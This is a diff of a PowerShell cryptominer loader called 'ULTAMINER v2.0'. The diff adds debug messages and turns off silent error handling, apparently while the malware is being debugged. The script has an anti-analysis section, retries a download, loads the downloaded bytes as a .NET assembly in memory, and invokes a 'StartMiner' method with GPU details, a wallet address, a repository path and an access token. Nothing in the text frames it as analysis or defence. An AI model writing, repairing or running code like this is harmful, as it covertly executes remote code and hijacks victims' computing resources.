@@ -1,8 +1,8 @@
 # === ULTAMINER v2.0 ===
 if (Test-Path "$PSScriptRoot\.lock") { return }
 
-$ProgressPreference = 'SilentlyContinue'
-$ErrorActionPreference = 'SilentlyContinue'
+# $ProgressPreference = 'SilentlyContinue'
+# $ErrorActionPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # === ANTI-ANALYSIS ===
@@ -180,12 +180,17 @@ for ($i = 1; $i -le $maxRetries; $i++) {
             }
         }
         if ($bytes -and $bytes.Length -gt 0) {
+            Write-Host "[+] DLL Downloaded ($($bytes.Length) bytes)"
             $asm = [Reflection.Assembly]::Load($bytes)
+            Write-Host "[+] Assembly Loaded: $($asm.FullName)"
             $repo = "$($c.u1)/$($c.u2)"
+            Write-Host "[*] Invoking StartMiner..."
             $asm.GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @($hw.gpu, $c.addr, $repo, $c.pat))
+            Write-Host "[+] StartMiner Invoked!"
             break
         }
     } catch {
+        Write-Host "[!] Error: $($_.Exception.Message)"
         if ($i -lt $maxRetries) { Start-Sleep -Seconds ($i * 5) }
     }
 }
